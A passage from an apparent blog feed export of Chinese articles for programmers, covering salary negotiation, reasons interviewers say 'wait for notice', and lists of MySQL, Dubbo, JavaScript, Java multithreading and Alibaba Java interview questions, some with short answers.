谈高价，即使对方压你价，你也能硬气坚挺你期望的薪资。</p><p><strong>总结一下</strong></p><p>为什么面试你要25K，HR只给你20K？现在知道为什么了，要么你确实要的高了，要么是企业因为各种原因给不了你那么多呗。</p><p>总之，想拿到期望薪资，一要技术要过硬，二要和目标公司整体非常匹配，最后也要了解目标公司的薪资状态。如果不了解，可以多问下身边的朋友同事，打听下，圈子就那么大。</p><ul><li>为什么面试完，总是让你回去等通知？</li><li>面试时如何介绍自己的项目经验？</li><li>如何在一分钟内搞定面试官？</li><li>阿里面试回来，和 Java 程序员谈一谈</li><li>面试Java高级开发，要准备哪些知识点？</li><li>……</li></ul><p>另外，关于谈薪，你有什么绝活？欢迎留言~</p>]]></content>
      
      
      <categories>
          
          <category> 程序人生 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 面试 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>为什么面试完，总是让你回去等通知？</title>
      <link href="/2025/10/30/%E9%9D%A2%E8%AF%95/%E4%B8%BA%E4%BB%80%E4%B9%88%E9%9D%A2%E8%AF%95%E5%AE%8C%EF%BC%8C%E6%80%BB%E6%98%AF%E8%AE%A9%E4%BD%A0%E5%9B%9E%E5%8E%BB%E7%AD%89%E9%80%9A%E7%9F%A5%EF%BC%9F/"/>
      <url>/2025/10/30/%E9%9D%A2%E8%AF%95/%E4%B8%BA%E4%BB%80%E4%B9%88%E9%9D%A2%E8%AF%95%E5%AE%8C%EF%BC%8C%E6%80%BB%E6%98%AF%E8%AE%A9%E4%BD%A0%E5%9B%9E%E5%8E%BB%E7%AD%89%E9%80%9A%E7%9F%A5%EF%BC%9F/</url>
      
        <content type="html"><![CDATA[<p>能点进来看的朋友，相信你们都应该有过同样的经历，那就是为什么面试之后，面试官总让你回去等通知，而这一等就是遥遥无期……</p><p>有时候是自己没发挥好，回去等通知就心里有一半预期是没戏了，有时候感觉非常良好，为什么还是让你回去等通知呢？</p><p>今天，栈长带你来分析一下这其中的厉害关系，面试官让你回去等通知无非有以下几种情况。</p><h2 id="1、婉拒"><a href="#1、婉拒" class="headerlink" title="1、婉拒"></a>1、婉拒</h2><p>这是一种委婉的拒绝，也是对求职者的尊重，不会直接说你不行，只会让你回去等通知，然后永远没有通知，这个时候你面试情况好不好，心里得有个大概了。</p><p>大部分人被通知回去等通知的情况应该是这种情况了，这可能有以下几种原因。</p><p>1、可能是你水平太菜，面试官看不上；</p><p>2、可能是你们交谈的时候，你的言词，或者态度什么的冒犯了面试官；</p><p>3、可能是你的盐值不够，或者是面试官看你不顺眼；</p><p>4、可能是你技术太强，已经盖过面试官的锋芒，有些气量小的面试官就可能担心自己在公司的地位，招你进来 Hold 不住你，然后让你回去等通知了；</p><p>5、可能一个小细节，让面试官放弃了你，比如：面试完不说谢谢，这样即使你前面面试很顺利，最后也有可能前功尽弃；</p><p>6、可能是你跳槽太频繁，人事觉得你可能不稳定，不是一个能长期为公司效力的人；</p><p>以及更多……</p><h2 id="2、备胎"><a href="#2、备胎" class="headerlink" title="2、备胎"></a>2、备胎</h2><p>这个时候，面试官手里可能有几张牌，不知道如何打，你只是他们手里的一个备胎而已，面试官当然不会明确拒绝你，因为你可能会用得上，也很可能就真的成了炮灰了。</p><p>一般情况下，他们会让你回去等通知，然后内部评估，后续再面试其他人选，然后从众多备胎中决选出他们最合适的人选。</p><p>为什么你会成为备胎，还不是你技术还有所欠缺，还达不到他们的要求呗，否则你会直接上位，拿下 Offer。</p><h2 id="3、流程"><a href="#3、流程" class="headerlink" title="3、流程"></a>3、流程</h2><p>这个就是大公司病了，有一年，年前，栈长也去某大公司面试过。当时面试感觉还行，也是让我回去等通知，但好些日子过去了，以为没戏了，我都放弃了，结果年后上班一个月了又通知我去谈工资。。。</p><p>那个时候，我都在新公司上班一个月了，自然就没去谈了……</p><p>栈长身边也有很多这样的案例，大公司走流程很慢，审核也慢，等你等到他们的通知的时候，你都可能已经在新公司上班了。</p><h2 id="4、套路"><a href="#4、套路" class="headerlink" title="4、套路"></a>4、套路</h2><p>这招大家可能都想不到，什么叫套路？</p><p>有些公司根本就不招人，打着招人的目的做着各种损人利己的事情。</p><p>比如：公司出现技术瓶颈了，或者技术难题了，不想花钱请大牛，又找不到解决办法，就直接招人来面试，问那些问题，从面试人的答案里套出解决方案什么的。。。</p><p>所以，这种情况，不管你面试情况如何，回去等通知就是永远没有通知。当然，不排除，人家看好你，你真的被录用了。</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>栈长说了这么多，可以总结一下了。</p><p>一般叫你回去等通知，那八、九成是没戏了，如果是大公司，面试情况又非常不错，那可以期待一下，不然别傻傻等待了。</p><p>另外，你还知道哪些不为人知的套路？</p><p>欢迎留言分享给大家，少走弯路……</p>]]></content>
      
      
      <categories>
          
          <category> 程序人生 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 面试 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>去 BAT 面试完的 MySQL 面试题总结</title>
      <link href="/2025/10/30/%E9%9D%A2%E8%AF%95/%E5%8E%BB%20BAT%20%E9%9D%A2%E8%AF%95%E5%AE%8C%E7%9A%84%20MySQL%20%E9%9D%A2%E8%AF%95%E9%A2%98%E6%80%BB%E7%BB%93/"/>
      <url>/2025/10/30/%E9%9D%A2%E8%AF%95/%E5%8E%BB%20BAT%20%E9%9D%A2%E8%AF%95%E5%AE%8C%E7%9A%84%20MySQL%20%E9%9D%A2%E8%AF%95%E9%A2%98%E6%80%BB%E7%BB%93/</url>
      
        <content type="html"><![CDATA[<p>1、一张表里面有ID自增主键，当insert了17条记录之后，删除了第15,16,17条记录，再把mysql重启，再insert一条记录，这条记录的ID是18还是15 ？</p><p>2、mysql的技术特点是什么？</p><p>3、Heap表是什么？</p><p>4、mysql服务器默认端口是什么？</p><p>5、与Oracle相比，mysql有什么优势？</p><p>6、如何区分FLOAT和DOUBLE？</p><p>7、区分CHAR_LENGTH和LENGTH？</p><p>8、请简洁描述mysql中InnoDB支持的四种事务隔离级别名称，以及逐级之间的区别？</p><p>9、在mysql中ENUM的用法是什么？</p><p>10、如何定义REGEXP？</p><p>11、CHAR和VARCHAR的区别？</p><p>12、列的字符串类型可以是什么？</p><p>13、如何获取当前的mysql版本？</p><p>14、mysql中使用什么存储引擎？</p><p>15、mysql驱动程序是什么？</p><p>16、TIMESTAMP在UPDATE　CURRENT_TIMESTAMP数据类型上做什么？</p><p>17、主键和候选键有什么区别？</p><p>18、如何使用Unix shell登录mysql？</p><p>19、 myisamchk是用来做什么的？</p><p>20、mysql数据库服务器性能分析的方法命令有哪些?</p><p>21、如何控制HEAP表的最大尺寸？</p><p>22、MyISAM Static和MyISAM Dynamic有什么区别？</p><p>23、federated表是什么？</p><p>24、如果一个表有一列定义为TIMESTAMP，将发生什么？</p><p>25、列设置为AUTO　INCREMENT时，如果在表中达到最大值，会发生什么情况？</p><p>26、怎样才能找出最后一次插入时分配了哪个自动增量？</p><p>27、你怎么看到为表格定义的所有索引？</p><p>28、LIKE声明中的％和_是什么意思？</p><p>29、如何在Unix和mysql时间戳之间进行转换？</p><p>30、列对比运算符是什么？</p><p>31、我们如何得到受查询影响的行数？</p><p>32、mysql查询是否区分大小写？</p><p>33、LIKE和REGEXP操作有什么区别？</p><p>34、BLOB和TEXT有什么区别？</p><p>35、mysql_fetch_array和mysql_fetch_object的区别是什么？</p><p>36、我们如何在mysql中运行批处理模式？</p><p>37、MyISAM表格将在哪里存储，并且还提供其存储格式？</p><p>38、mysql中有哪些不同的表格？</p><p>39、ISAM是什么？</p><p>40、InnoDB是什么？</p><p>41、mysql如何优化DISTINCT？</p><p>42、如何输入字符为十六进制数字？</p><p>43、如何显示前50行？</p><p>44、可以使用多少列创建索引？</p><p>45、NOW（）和CURRENT_DATE（）有什么区别？</p><p>46、什么样的对象可以使用CREATE语句创建？</p><p>47、mysql表中允许有多少个TRIGGERS？</p><p>48、什么是非标准字符串类型？</p><p>49、什么是通用SQL函数？</p><p>50、解释访问控制列表</p><p>51、mysql支持事务吗？</p><p>52、mysql里记录货币用什么字段类型好？</p><p>53、mysql数据表在什么情况下容易损坏？</p><p>54、mysql有关权限的表都有哪几个？</p><p>55、mysql中有哪几种锁？</p>]]></content>
      
      
      <categories>
          
          <category> 程序人生 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 面试 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>史上最全 40 道 Dubbo 面试题及答案！</title>
      <link href="/2025/10/30/%E9%9D%A2%E8%AF%95/%E5%8F%B2%E4%B8%8A%E6%9C%80%E5%85%A8%2040%20%E9%81%93%20Dubbo%20%E9%9D%A2%E8%AF%95%E9%A2%98%E5%8F%8A%E7%AD%94%E6%A1%88%EF%BC%81/"/>
      <url>/2025/10/30/%E9%9D%A2%E8%AF%95/%E5%8F%B2%E4%B8%8A%E6%9C%80%E5%85%A8%2040%20%E9%81%93%20Dubbo%20%E9%9D%A2%E8%AF%95%E9%A2%98%E5%8F%8A%E7%AD%94%E6%A1%88%EF%BC%81/</url>
      
        <content type="html"><![CDATA[<p>想往高处走，怎么能不懂 Dubbo？</p><p>Dubbo是国内最出名的分布式服务框架，也是 Java 程序员必备的必会的框架之一。Dubbo 更是中高级面试过程中经常会问的技术，无论你是否用过，你都必须熟悉。</p><p>下面我为大家准备了一些 Dubbo 常见的的面试题，一些是我经常问别人的，一些是我过去面试遇到的一些问题，总结给大家，希望对大家能有所帮助。</p><hr><p>1、Dubbo是什么？</p><p>2、为什么要用Dubbo？</p><p>3、Dubbo 和 Spring Cloud 有什么区别？</p><p>4、dubbo都支持什么协议，推荐用哪种？</p><p>5、Dubbo需要 Web 容器吗？</p><p>6、Dubbo内置了哪几种服务容器？</p><p>7、Dubbo里面有哪几种节点角色？</p><p>8、画一画服务注册与发现的流程图</p><p>9、Dubbo默认使用什么注册中心，还有别的选择吗？</p><p>10、Dubbo有哪几种配置方式？</p><p>11、Dubbo 核心的配置有哪些？</p><p>12、在 Provider 上可以配置的 Consumer 端的属性有哪些？</p><p>13、Dubbo启动时如果依赖的服务不可用会怎样？</p><p>14、Dubbo推荐使用什么序列化框架，你知道的还有哪些？</p><p>15、Dubbo默认使用的是什么通信框架，还有别的选择吗？</p><p>16、Dubbo有哪几种集群容错方案，默认是哪种？</p><p>17、Dubbo有哪几种负载均衡策略，默认是哪种？</p><p>18、注册了多个同一样的服务，如果测试指定的某一个服务呢？</p><p>19、Dubbo支持服务多协议吗？</p><p>20、当一个服务接口有多种实现时怎么做？</p><p>21、服务上线怎么兼容旧版本？</p><p>22、Dubbo可以对结果进行缓存吗？</p><p>23、Dubbo服务之间的调用是阻塞的吗？</p><p>24、Dubbo支持分布式事务吗？</p><p>25、Dubbo telnet 命令能做什么？</p><p>26、Dubbo支持服务降级吗？</p><p>27、Dubbo如何优雅停机？</p><p>28、服务提供者能实现失效踢出是什么原理？</p><p>29、如何解决服务调用链过长的问题？</p><p>30、服务读写推荐的容错策略是怎样的？</p><p>31、Dubbo必须依赖的包有哪些？</p><p>32、Dubbo的管理控制台能做什么？</p><p>33、说说 Dubbo 服务暴露的过程。</p><p>34、Dubbo 停止维护了吗？</p><p>35、Dubbo 和 Dubbox 有什么区别？</p><p>36、你还了解别的分布式框架吗？</p><p>37、Dubbo 能集成 Spring Boot 吗？</p><p>38、在使用过程中都遇到了些什么问题？</p><p>39、你读过 Dubbo 的源码吗？</p><p>40、你觉得用 Dubbo 好还是 Spring Cloud 好？</p><hr><p>暂时想到这些，希望对大家有帮助。</p><p>这篇文章是博主国庆放的大招，点赞转发下吧，这就是对博主最大的支持。</p>]]></content>
      
      
      <categories>
          
          <category> 程序人生 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 面试 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>史上最全 Javascript 面试题及答案</title>
      <link href="/2025/10/30/%E9%9D%A2%E8%AF%95/%E5%8F%B2%E4%B8%8A%E6%9C%80%E5%85%A8%20Javascript%20%E9%9D%A2%E8%AF%95%E9%A2%98%E5%8F%8A%E7%AD%94%E6%A1%88/"/>
      <url>/2025/10/30/%E9%9D%A2%E8%AF%95/%E5%8F%B2%E4%B8%8A%E6%9C%80%E5%85%A8%20Javascript%20%E9%9D%A2%E8%AF%95%E9%A2%98%E5%8F%8A%E7%AD%94%E6%A1%88/</url>
      
        <content type="html"><![CDATA[<p>1、如何判断一个变量是数组还是字符串？</p><p>使用typeof。</p><p>2、“=&#x3D;”与“&#x3D;&#x3D;&#x3D;”的区别？</p><p>“&#x3D;&#x3D;”是相等运算符，会隐式转换。<br>“&#x3D;&#x3D;&#x3D;”是严格运算符，会判断类型。</p><p>3、如何去除字符串中的所有空格？</p><p>function trim(str){<br>    return str.replace(&#x2F;\s|\xA0&#x2F;g,””);<br>}</p><p>4、如何获取当前浏览的URL？</p><p>window.location.href</p><p>5、怎样添加、删除、移动、复制、创建和查找节点？</p><p>1）创建新节点</p><p>createDocumentFragment() &#x2F;&#x2F;创建一个DOM片段</p><p>createElement() &#x2F;&#x2F;创建一个具体的元素</p><p>createTextNode() &#x2F;&#x2F;创建一个文本节点</p><p>2）添加、移除、替换、插入</p><p>appendChild() &#x2F;&#x2F;添加</p><p>removeChild() &#x2F;&#x2F;移除</p><p>replaceChild() &#x2F;&#x2F;替换</p><p>insertBefore() &#x2F;&#x2F;插入</p><p>3）查找</p><p>getElementsByTagName() &#x2F;&#x2F;通过标签名称</p><p>getElementsByName() &#x2F;&#x2F;通过元素的Name属性的值</p><p>getElementById() &#x2F;&#x2F;通过元素Id，唯一性</p><p>实现一个函数clone，可以对JavaScript中的5种主要的数据类型(包括Number、String、Object、Array、Boolean)进行值复制。</p><p>6、什么是闭包？</p><p>闭包就是能够读取其他函数内部变量的函数。</p><p>7、JS中const、let、var之间的区别</p><p>1）const定义的变量不可以修改，而且必须初始化。</p><p>2）var定义的变量可以修改，如果不初始化会输出undefined，不会报错。</p><p>3）let是块级作用域，函数内部使用let定义后，对函数外部无影响。</p><p>8、什么叫同源策略？有什么用？</p><p>同源策略是指域名，协议，端口相同，只有同源的脚本才会被执行。</p><p>9、什么是Ajax? 适用于哪些应用场景？</p><p>Ajax是一种在无需重新加载整个网页的情况下，能够更新部分网页的技术。<br>如：无刷新判断验证码是否输入正确等。</p><p>10、Ajax请求时get和post有什么区别？</p><p>1）get参数放在url后面，post放在http body里面<br>2）有大小限制,get受url长度限制，post受内存限制<br>3）安全问题，get明文传输不侬好<br>4）应用不同，get用于获取数据，post提交数据</p><p>11、谈谈Jsonp的原理？</p><p>动态创建script标签，回调函数</p><p>12、split()和join()函数的区别？</p><p>前者是切割成数组的形式，后者是将数组转换成字符串</p><p>13、写出3个使用this的典型应用。</p><p>1）事件：如onclick  this-&gt;发生事件的对象<br>2）构造函数：this-&gt;new 出来的object<br>3）call&#x2F;apply：改变this</p><p>14、怎么使用JS改变元素的class？</p><p>object.ClassName &#x3D; xxxx</p><p>15、普通事件与绑定事件有什么区别？</p><p>普通事件只支持单个事件，而事件绑定可以添加多个事件</p><p>16、请描述js里事件的三个阶段。</p><p>捕获、处于目标阶段、冒泡阶段(IE8以下只支持冒泡)</p><p>17、数组方法pop() push() unshift() shift()都有什么用？</p><p>push()：尾部添加<br>pop()：尾部删除<br>unshift()：头部添加<br>shift()：头部删除</p><p>18、IE和DOM事件流的区别是什么？</p><p>1）执行顺序不一样<br>2）参数不一样<br>3）事件加不加on<br>4）this指向问题</p><p>19、call和apply有什么区别？</p><p>call与apply的区别就是参数写法不同:</p><p>a.call(b,arg1,arg2,…)<br>a.apply(b,[arg1,arg2,…])</p><p>20、什么是事件委托？</p><p>让利用事件冒泡的原理，让自己的所触发的事件，让他的父元素代替执行！</p><p>21、JS中的本地对象，内置对象和宿主对象分别有哪些？</p><p>本地对象：array obj regExp等可以new实例化的<br>内置对象：Math等不可以实例化的<br>宿主对象：document window等浏览器自带的</p><p>22、document load 和 document ready 的区别是什么？</p><p>load必须等到页面内包括图片的所有元素加载完毕后才能执行。 ready是DOM结构绘制完毕后就执行，不必等到加载完毕。 </p><p>23、你怎么理解WebPack和Grunt和Gulp？</p><p>Webpack可以看做是模块打包器，把你的代码转换成合适的格式供浏览器使用；</p><p>常用webpack构建本地服务器，可以让浏览器监听你代码的修改，自动刷新现实后的结果；</p><p>Gulp&#x2F;Grunt是一种能够优化前端开发的流程工具，而WebPack是一种模块化的解决方案；</p><p>WebPack有4个配置选项，打包速度越快，负面作用就越大，会不利于调试，文件的执行效率也有一定的影响；开发阶段使用：eval-source-map：使用eval打包源文件模块，在同一个文件中生成干净的完整的source map。这个选项可以在不影响构建速度的前提下生成完整的sourcemap，但是对打包后输出的JS文件的执行具有性能和安全的隐患。在开发阶段这是一个非常好的选项，在生产阶段则一定不要启用这个选项；</p><p>babel是一个编译js的平台，把es6&#x2F;es7转换成浏览器支持的es5提供浏览器使用；</p><p>24、JS有哪几种数据类型？</p><p>String,Number,Boolean,Null,Undefined；Object,Array,Function（引用类型）</p><p>25、什么是ES？ES和JS有什么联系？</p><p>要讲清楚这个问题，需要回顾历史。1996年11月，JavaScript的创造者Netscape公司，决定将JavaScript提交给国际标准化组织ECMA，希望这种语言能够成为国际标准。次年，ECMA发布262号标准文件（ECMA-262）的第一版，规定了浏览器脚本语言的标准，并将这种语言称为ECMAScript，这个版本就是1.0版。</p><p>该标准从一开始就是针对JavaScript语言制定的，但是之所以不叫JavaScript，有两个原因。一是商标，Java是Sun公司的商标，根据授权协议，只有Netscape公司可以合法地使用JavaScript这个名字，且JavaScript本身也已经被Netscape公司注册为商标。二是想体现这门语言的制定者是ECMA，不是Netscape，这样有利于保证这门语言的开放性和中立性。</p><p>因此，ECMAScript和JavaScript的关系是，前者是后者的规格，后者是前者的一种实现（另外的ECMAScript方言还有Jscript和ActionScript）。在日常场合，这两个词是可以互换的。</p><p>26、ES6有哪些新特性？</p><p>箭头操作符；对class的支持（constructor构造函数）；不定参数…x；let和const关键字；for of遍历；模块的支持import；promise异步函数的处理模式(pending等待中；resolve返回成功，reject返回失败)；</p><p>27、typeof都会返回什么数据类型？</p><p>Object number function boolean underfind</p><p>28、请例举3种强制类型转换和2种隐式类型转换。</p><p>29、截取字符串javastack的java?</p><p>30、如何规避javascript多人开发函数重名问题？</p><p>31、检测一个变量是否是String类型有哪几种方式？</p><p> 1）typeof(obj) &#x3D;&#x3D; ‘string’<br> 2）obj.constructor &#x3D;&#x3D; String;</p><p>32、请说出至少三种减低页面加载时间的方法。</p><p>1）压缩css、js文件<br>2）合并js、css文件，减少http请求<br>3）外部js、css文件放在最底下<br>4）减少dom操作，尽可能用变量替代不必要的dom操作</p><p>33、请详细解释Ajax的工作原理。</p><p>1）创建ajax对象（XMLHttpRequest&#x2F;ActiveXObject(Microsoft.XMLHttp)）<br>2）判断数据传输方式(GET&#x2F;POST)<br>3）打开链接 open()<br>4）发送 send()<br>5）当ajax对象完成第四步（onreadystatechange）数据接收完成，判断http响应状态（status）200-300之间或者304（缓存）执行回调函数</p><p>34、JS中有哪几种函数？</p><p>具名函数（命名函数）和匿名函数。</p><p>35、请至少写出3种创建函数的方式。</p><p>1）声明函数</p><p>function fn1(){}</p><p>2）创建匿名函数表达式</p><p>var fn1 &#x3D; function (){}</p><p>3）创建具名函数表达式</p><p>var fn1 &#x3D; function javastack(){};</p><p>36、什么是跨域？解决跨域的方法有哪些？</p><p>由于浏览器同源策略，凡是发送请求url的协议、域名、端口三者之间任意一个与当前页面地址不同即为跨域。</p><p>解决方案：JSONP、CORS、代理、服务器实现等。</p><hr>]]></content>
      
      
      <categories>
          
          <category> 程序人生 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 面试 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>史上最全 Java 多线程面试题及答案</title>
      <link href="/2025/10/30/%E9%9D%A2%E8%AF%95/%E5%8F%B2%E4%B8%8A%E6%9C%80%E5%85%A8%20Java%20%E5%A4%9A%E7%BA%BF%E7%A8%8B%E9%9D%A2%E8%AF%95%E9%A2%98%E5%8F%8A%E7%AD%94%E6%A1%88/"/>
      <url>/2025/10/30/%E9%9D%A2%E8%AF%95/%E5%8F%B2%E4%B8%8A%E6%9C%80%E5%85%A8%20Java%20%E5%A4%9A%E7%BA%BF%E7%A8%8B%E9%9D%A2%E8%AF%95%E9%A2%98%E5%8F%8A%E7%AD%94%E6%A1%88/</url>
      
        <content type="html"><![CDATA[<p><img src="https://udemy-images.udemy.com/course/480x270/358540_d06b_6.jpg" alt="image"></p><p>多线程并发编程是Java编程中重要的一块内容，也是面试重点覆盖区域。所以，学好多线程并发编程对Java程序员来来说极其重要的。下面小编整理了60道最常见的Java多线程面试题及答案，供你学习或者面试参考。</p><ol><li><p>多线程有什么用？</p></li><li><p>线程和进程的区别是什么？</p></li><li><p>ava实现线程有哪几种方式？</p></li><li><p>启动线程方法start()和run()有什么区别？</p></li><li><p>怎么终止一个线程？如何优雅地终止线程？</p></li><li><p>一个线程的生命周期有哪几种状态？它们之间如何流转的？</p></li><li><p>线程中的wait()和sleep()方法有什么区别？</p></li><li><p>多线程同步有哪几种方法？</p></li><li><p>什么是死锁？如何避免死锁？</p></li><li><p>多线程之间如何进行通信？</p></li><li><p>线程怎样拿到返回结果？</p></li><li><p>violatile关键字的作用？</p></li><li><p>新建T1、T2、T3三个线程，如何保证它们按顺序执行？</p></li><li><p>怎么控制同一时间只有3个线程运行？</p></li><li><p>为什么要使用线程池？</p></li><li><p>常用的几种线程池并讲讲其中的工作原理。</p></li><li><p>线程池启动线程submit()和execute()方法有什么不同？</p></li><li><p>CyclicBarrier和CountDownLatch的区别？</p></li><li><p>什么是活锁、饥饿、无锁、死锁？</p></li><li><p>什么是原子性、可见性、有序性？</p></li><li><p>什么是守护线程？有什么用？</p></li><li><p>怎么中断一个线程？如何保证中断业务不影响？</p></li><li><p>一个线程运行时发生异常会怎样？</p></li><li><p>什么是重入锁？</p></li><li><p>Synchronized有哪几种用法？</p></li><li><p>Fork&#x2F;Join框架是干什么的？</p></li><li><p>线程数过多会造成什么异常？</p></li><li><p>说说线程安全的和不安全的集合。</p></li><li><p>什么是CAS算法？在多线程中有哪些应用。</p></li><li><p>怎么检测一个线程是否拥有锁？</p></li><li><p>Jdk中排查多线程问题用什么命令？</p></li><li><p>线程同步需要注意什么？</p></li><li><p>线程wait()方法使用有什么前提？</p></li><li><p>Fork&#x2F;Join框架使用有哪些要注意的地方？</p></li><li><p>线程之间如何传递数据？</p></li><li><p>保证”可见性”有哪几种方式？</p></li><li><p>说几个常用的Lock接口实现锁。</p></li><li><p>ThreadLocal是什么？有什么应用场景？</p></li><li><p>ReadWriteLock有什么用？</p></li><li><p>FutureTask是什么？</p></li><li><p>怎么唤醒一个阻塞的线程？</p></li><li><p>不可变对象对多线程有什么帮助？</p></li><li><p>多线程上下文切换是什么意思？</p></li><li><p>Java中用到了什么线程调度算法？</p></li><li><p>Thread.sleep(0)的作用是什么？</p></li><li><p>Java内存模型是什么，哪些区域是线程共享的，哪些是不共享的</p></li><li><p>什么是乐观锁和悲观锁？</p></li><li><p>Hashtable的size()方法为什么要做同步？</p></li><li><p>同步方法和同步块，哪种更好？</p></li><li><p>什么是自旋锁？</p></li><li><p>Runnable和Thread用哪个好？</p></li><li><p>Java中notify和notifyAll有什么区别？</p></li><li><p>为什么wait&#x2F;notify&#x2F;notifyAll这些方法不在thread类里面？</p></li><li><p>为什么wait和notify方法要在同步块中调用？</p></li><li><p>为什么你应该在循环中检查等待条件？</p></li><li><p>Java中堆和栈有什么不同？</p></li><li><p>你如何在Java中获取线程堆栈？</p></li><li><p>如何创建线程安全的单例模式？</p></li><li><p>什么是阻塞式方法？</p></li><li><p>提交任务时线程池队列已满会时发会生什么？</p></li></ol><h4 id="答案整理"><a href="#答案整理" class="headerlink" title="答案整理"></a>答案整理</h4><hr><p>小编花了几个小时整理了这些面试题和答案，十分不容易。正所谓我为人人，人人为我。你们的分享就是我以后最大的创作动力，只要<strong>分享此文到朋友圈</strong>，<strong>满10个赞</strong>并发送截图到公众号，就可获取以上所有面试题答案。</p><p>如果你不想分享，可以在公众号中回复”<strong>面试题答案</strong>“，了解更多获取方法，和更多已出面试题及答案。</p><p><img src="http://img.javastack.cn/javastack.png"></p>]]></content>
      
      
      <categories>
          
          <category> 程序人生 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 面试 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>史上最全阿里 Java 面试题总结</title>
      <link href="/2025/10/30/%E9%9D%A2%E8%AF%95/%E5%8F%B2%E4%B8%8A%E6%9C%80%E5%85%A8%E9%98%BF%E9%87%8C%20Java%20%E9%9D%A2%E8%AF%95%E9%A2%98%E6%80%BB%E7%BB%93/"/>
      <url>/2025/10/30/%E9%9D%A2%E8%AF%95/%E5%8F%B2%E4%B8%8A%E6%9C%80%E5%85%A8%E9%98%BF%E9%87%8C%20Java%20%E9%9D%A2%E8%AF%95%E9%A2%98%E6%80%BB%E7%BB%93/</url>
      
        <content type="html"><![CDATA[<p>以下为大家整理了阿里巴巴史上最全的 Java 面试题，涉及大量 Java 面试知识点和相关试题。</p><hr><p><strong>JAVA基础</strong></p><ol><li>JAVA中的几种基本数据类型是什么，各自占用多少字节。</li><li>String类能被继承吗，为什么。</li><li>String，Stringbuffer，StringBuilder的区别。</li><li>ArrayList和LinkedList有什么区别。</li><li>讲讲类的实例化顺序，比如父类静态数据，构造函数，字段，子类静态数据，构造函数，字<br>段，当new的时候，他们的执行顺序。</li><li>用过哪些Map类，都有什么区别，HashMap是线程安全的吗,并发下使用的Map是什么，他们<br>内部原理分别是什么，比如存储方式，hashcode，扩容，默认容量等。</li><li>JAVA8的ConcurrentHashMap为什么放弃了分段锁，有什么问题吗，如果你来设计，你如何<br>设计。</li><li>有没有有顺序的Map实现类，如果有，他们是怎么保证有序的。</li><li>抽象类和接口的区别，类可以继承多个类么，接口可以继承多个接口么,类可以实现多个接口<br>么。</li><li>继承和聚合的区别在哪。</li><li>IO模型有哪些，讲讲你理解的nio ，他和bio，aio的区别是啥，谈谈reactor模型。</li><li>反射的原理，反射创建类实例的三种方式是什么。</li><li>反射中，Class.forName和ClassLoader区别 。</li><li>描述动态代理的几种实现方式，分别说出相应的优缺点。</li><li>动态代理与cglib实现的区别。</li><li>为什么CGlib方式可以对接口实现代理。</li><li>final的用途。</li><li>写出三种单例模式实现 。</li><li>如何在父类中为子类自动完成所有的hashcode和equals实现？这么做有何优劣。</li><li>请结合OO设计理念，谈谈访问修饰符public、private、protected、default在应用设<br>计中的作用。</li><li>深拷贝和浅拷贝区别。</li><li>数组和链表数据结构描述，各自的时间复杂度。</li><li>error和exception的区别，CheckedException，RuntimeException的区别。</li><li>请列出5个运行时异常。</li><li>在自己的代码中，如果创建一个java.lang.String类，这个类是否可以被类加载器加<br>载？为什么。</li><li>说一说你对java.lang.Object对象中hashCode和equals方法的理解。在什么场景下需<br>要重新实现这两个方法。</li><li>在jdk1.5中，引入了泛型，泛型的存在是用来解决什么问题。</li><li>这样的a.hashcode() 有什么用，与a.equals(b)有什么关系。</li><li>有没有可能2个不相等的对象有相同的hashcode。</li><li>Java中的HashSet内部是如何工作的。</li><li>什么是序列化，怎么序列化，为什么序列化，反序列化会遇到什么问题，如何解决。</li><li>java8的新特性。</li></ol><p><strong>JVM知识</strong></p><ol><li>什么情况下会发生栈内存溢出。</li><li>JVM的内存结构，Eden和Survivor比例。</li><li>JVM内存为什么要分成新生代，老年代，持久代。新生代中为什么要分为Eden和Survivor。</li><li>JVM中一次完整的GC流程是怎样的，对象如何晋升到老年代，说说你知道的几种主要的JVM参<br>数。</li><li>你知道哪几种垃圾收集器，各自的优缺点，重点讲下cms和G1，包括原理，流程，优缺点。</li><li>垃圾回收算法的实现原理。</li><li>当出现了内存溢出，你怎么排错。</li><li>JVM内存模型的相关知识了解多少，比如重排序，内存屏障，happen-before，主内存，工作<br>内存等。</li><li>简单说说你了解的类加载器，可以打破双亲委派么，怎么打破。</li><li>讲讲JAVA的反射机制。</li><li>你们线上应用的JVM参数有哪些。</li><li>g1和cms区别,吞吐量优先和响应优先的垃圾收集器选择。</li><li>怎么打出线程栈信息。</li><li>请解释如下jvm参数的含义：<br>-server -Xms512m -Xmx512m -Xss1024K<br>-XX:PermSize&#x3D;256m -XX:MaxPermSize&#x3D;512m -<br>XX:MaxTenuringThreshold&#x3D;20XX:CMSInitiatingOccupancyFraction&#x3D;80 -<br>XX:+UseCMSInitiatingOccupancyOnly。</li></ol><p><strong>开源框架知识</strong></p><ol><li>简单讲讲tomcat结构，以及其类加载器流程，线程模型等。</li><li>tomcat如何调优，涉及哪些参数 。</li><li>讲讲Spring加载流程。</li><li>Spring AOP的实现原理。</li><li>讲讲Spring事务的传播属性。</li><li>Spring如何管理事务的。</li><li>Spring怎么配置事务（具体说出一些关键的xml 元素）。</li><li>说说你对Spring的理解，非单例注入的原理？它的生命周期？循环注入的原理，aop的实现原<br>理，说说aop中的几个术语，它们是怎么相互工作的。</li><li>Springmvc 中DispatcherServlet初始化过程。</li><li>netty的线程模型，netty如何基于reactor模型上实现的。</li><li>为什么选择netty。</li><li>什么是TCP粘包，拆包。解决方式是什么。</li><li>netty的fashwheeltimer的用法，实现原理，是否出现过调用不够准时，怎么解决。</li><li>netty的心跳处理在弱网下怎么办。</li><li>netty的通讯协议是什么样的。</li><li>springmvc用到的注解，作用是什么，原理。</li><li>springboot启动机制。</li><li>点击<a 